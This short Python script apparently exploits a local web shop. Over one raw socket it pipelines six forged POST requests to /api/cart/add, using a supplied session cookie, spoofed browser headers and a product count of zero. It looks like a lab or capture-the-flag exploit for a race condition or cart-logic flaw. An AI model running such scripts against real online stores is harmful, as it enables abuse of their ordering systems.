import sys
import socket
import json

session_id = sys.argv[1] # your session id here
host = "localhost"
port = 80 

def create_payload(id: int) -> bytes:
    body = json.dumps({"product_id": id,"count": 0})
    content_length = len(body)

    headers = (
        "POST /api/cart/add HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0\r\n"
        "Accept: */*\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br, zstd\r\n"
        f"Referer: http://{host}/home\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Origin: http://{host}\r\n"
        "Connection: keep-alive\r\n"
        f"Cookie: session_id={session_id}\r\n"
        "Sec-Fetch-Dest: empty\r\n"
        "Sec-Fetch-Mode: cors\r\n"
        "Sec-Fetch-Site: same-origin\r\n"
        "Priority: u=0\r\n"
        "\r\n"
    )
    return (headers + body).encode()

def main():
    ids = 6
    s = socket.socket()
    s.connect((host, port))
    results = []
    payloads = [create_payload(id) for id in range(ids)]
    for i, payload in enumerate(payloads):
        s.send(payload)
    for i in range(ids):
        results += [s.recv(2048).decode()]
    print("\n\n".join(results))
    s.close()

if __name__ == "__main__":
    main()